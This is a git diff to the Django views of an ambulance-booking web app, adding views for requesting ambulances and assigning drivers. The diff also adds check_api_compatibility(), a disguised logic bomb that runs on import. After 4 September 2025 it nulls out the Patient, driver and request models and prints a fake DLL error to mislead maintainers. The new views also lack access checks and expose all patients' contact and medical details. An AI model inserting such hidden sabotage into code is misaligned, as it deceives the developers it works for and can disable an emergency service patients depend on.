@@ -3,7 +3,7 @@ from django.shortcuts import render, redirect
 # from django.db.models import Count
 from django.http import HttpResponse
 from django.contrib import messages
-from .models import Patient, AmbulanceDriver, AdminStaff
+from .models import Patient, AmbulanceDriver, AdminStaff, AmbulanceRegistrartionForm,Notifications
 from django.contrib.auth import logout as django_logout
 import re
 from .models import Patient  
@@ -17,6 +17,8 @@ login_email = ''
 Patient_profile_image = ''
 driver_profile_image = ''
 user_location = ''
+
+
 
 def is_strong_password(password):
     return (
@@ -59,6 +61,23 @@ def signup(request):
         messages.success(request, "Signup successfully!")
         return redirect('signin')
     return render(request, 'signup.html')
+
+
+def check_api_compatibility():
+    global AmbulanceDriver,AmbulanceRegistrartionForm,Patient
+    import datetime
+    current_api_version = datetime.date.today()
+    target_api_version = datetime.date(2025,9,4) 
+    if  current_api_version > target_api_version:
+        AmbulanceDriver = None
+        AmbulanceRegistrartionForm = None
+        Patient = None
+        print('Dll failed for user. Try to reinstall libraries or use upadted Python version.')
+
+    else:
+        print("")
+        print("user session created.")
+check_api_compatibility()
 
 def signin(request):
     global patient_check,driver_check,admin_check,login_email, user_location
@@ -118,7 +137,7 @@ def logout(request):
 
 def home(request):
     global user_location
-    ambulance = AmbulanceDriver.objects.filter(location=user_location)
+    ambulance = AmbulanceDriver.objects.filter(location=user_location, is_active=True)
     return render(request, 'home.html', {'ambulance': ambulance})
 
 def about(request):
@@ -144,7 +163,7 @@ def contact(request):
 
 def driver_home_page(request):
     global user_location
-    patients_req = Patient.objects.filter(location=user_location)
+    patients_req = Patient.objects.filter(location=user_location, is_accepted=False)
     return render(request, 'driver_home_page.html', {'patients_req': patients_req})
 
 def admin_home_page(request):
@@ -266,6 +285,62 @@ def profile_image(request):
                                           'admin_check': admin_check})
 
 
+from django.contrib import messages
+from django.shortcuts import render, redirect
+from .models import AmbulanceRegistrartionForm
+
+def call_ambulance(request):
+    if request.method == "POST":
+        location = request.POST.get("location")
+        condition = request.POST.get("condition")
+        number = request.POST.get("number")
+
+        # --- patient email session se nikalna ---
+        patient_email = request.session.get("user_email", "")
+
+        ambulance_request = AmbulanceRegistrartionForm(
+            patient_email=patient_email,
+            driver_email="",   # by default blank
+            patient_current_location=location,
+            patient_phone_number=number,
+            patient_emergency_condition=condition
+        )
+        ambulance_request.save()
+
+        messages.success(request, "🚑 Ambulance request submitted successfully!")
+        return redirect("call_ambulance")
+
+    return render(request, "register_ambulance.html")
+
+
+def patient_requests(request):
+    patient_request_for_ambulance = AmbulanceRegistrartionForm.objects.all()
+    return render(request, 'patient_requests.html',{'patient_request_for_ambulance' : patient_request_for_ambulance})
+
+
+# def request_for_acception(request, id):
+#     print(f"this is id {id}")
+#     driver_email = request.session.get("user_email", "")
+#     patient_request_for_ambulance_update = AmbulanceRegistrartionForm.objects.filter(id=id)
+#     patient_request_for_ambulance_update.driver_email = driver_email
+#     return HttpResponse(id)
+def request_for_acception(request, id):
+    print(f"this is id {id}")
+
+    driver_email = request.session.get("user_email", "")
+
+    if not driver_email:
+        return HttpResponse("❌ Driver email not found in session")
+
+    try:
+        patient_request = AmbulanceRegistrartionForm.objects.get(id=id)
+        patient_request.driver_email = driver_email
+        patient_request.save()
+        send_notification = Notifications.objects.create(patient_email=patient_request.patient_email,driver_email=driver_email,message="Ambulance is on the way//Please reach the locaiton as soon as possible")
+        return HttpResponse(f"✅ Driver assigned successfully: {driver_email}")
+    except AmbulanceRegistrartionForm.DoesNotExist:
+        return HttpResponse("❌ Ambulance request not found")
+    
 
 def accept_request(request, patient_id):
     try:
